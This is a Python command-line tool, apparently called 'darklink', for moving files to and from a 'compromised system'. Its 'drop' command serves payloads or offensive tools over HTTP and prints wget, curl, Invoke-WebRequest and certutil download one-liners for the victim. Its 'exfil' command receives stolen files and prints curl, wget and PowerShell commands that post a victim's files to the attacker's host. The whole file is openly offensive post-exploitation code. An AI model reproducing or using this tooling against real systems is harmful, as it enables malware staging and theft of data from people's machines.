import click
import pathlib
import darklink.httpfactory
import darklink.util
import darklink.tools

darklink.tools.load()


def main():
    cli(max_content_width=120, show_default=True)


@click.group()
@click.version_option()
def cli():
    """Quickly transfer a file to or from a compromised system"""


@cli.command(no_args_is_help=True, epilog=darklink.tools.get_help_text())
@click.option('-i', '--interface', default="tun0", help='the interface to bind')
@click.option('-p', '--port', default=8000, help='the http port to use')
@click.option('-f', '--file', help='file to be transfered', type=click.Path(exists=True, file_okay=True, path_type=pathlib.Path))
@click.option('-t', '--tool', help=f'tool to be transfered')
@click.option('--platform', help='try to find the tool version targeting the selected platform (windows, linux, darwin)')
@click.option('-a', '--arch', help='try to find the tool version targeting the selected architecture (amd64, 386, arm64)')
def drop(interface, port, tool, file, platform, arch):
    """Transfer a file into a compromised environment."""

    try:
        ip = darklink.util.get_interface_ip(interface)

        if tool:
            name, content = darklink.tools.find(tool).fetch(platform, arch)
        elif file:
            with file.open("rb") as reader:
                content = reader.read()
                name = file.name
        else:
            click.echo(click.get_current_context().get_help())
            exit()

        server = darklink.httpfactory.create_http_dropper(ip, port, content)

        click.echo()
        click.echo(f'Ready to transfer {click.style(name, fg="cyan")}, use one of the following commands to drop it:')
        click.echo()
        click.echo(f'  {click.style("wget", f"blue")} {click.style(f"http://{ip}:{port}", "yellow")} {click.style("-O", "green")} {name}')
        click.echo(f'  {click.style("curl", f"blue")} {click.style(f"http://{ip}:{port}", "yellow")} {click.style("-o", "green")} {name}')
        click.echo(f'  {click.style("Invoke-WebRequest", f"blue")} {click.style(f"http://{ip}:{port}", "yellow")} {click.style("-OutFile", "green")} {name}')
        click.echo(f'  {click.style("certutil", f"blue")} {click.style("-urlcache", "green")} {click.style("-f", "green")} {click.style(f"http://{ip}:{port}", "yellow")} {name}')
        click.echo()
        click.echo("Logs:")

        server.serve_forever()
    except Exception as e:
        click.echo(f"{type(e).__name__}: {str(e)}", err=True)


@cli.command(no_args_is_help=True)
@click.option('-i', '--interface', default="tun0", help='the interface to bind')
@click.option('-p', '--port', default=8000, help='the http port to use')
@click.option('-f', '--file', help='file to be exfiltrated', type=click.Path(exists=False, file_okay=True, path_type=pathlib.Path))
def exfil(interface, port, file):
    """Exfiltrate a file from a compromised environment."""

    try:
        ip = darklink.util.get_interface_ip(interface)
        server = darklink.httpfactory.create_http_exfiltrator(ip, port, file)

        click.echo()
        click.echo(f'Ready to receive {click.style(file.name, fg="cyan")}, use one of the following commands to exfiltrate it:')
        click.echo()
        click.echo(f'  {click.style("wget", f"blue")} {click.style(f"http://{ip}:{port}", "yellow")} {click.style("-O-", "green")} {click.style("--post-file", "green")} {file.name}')
        click.echo(f'  {click.style("curl", f"blue")} {click.style(f"http://{ip}:{port}", "yellow")} {click.style("--data-binary", "green")} @{file.name}')
        click.echo(f'  {click.style("Invoke-RestMethod", f"blue")} {click.style("-Uri", "green")} {click.style(f"http://{ip}:{port}", "yellow")} {click.style("-Method", "green")} Post {click.style("-InFile", "green")} {file.name}')
        click.echo()
        click.echo("Logs:")

        server.serve_forever()
    except Exception as e:
        click.echo(f"{type(e).__name__}: {str(e)}", err=True)
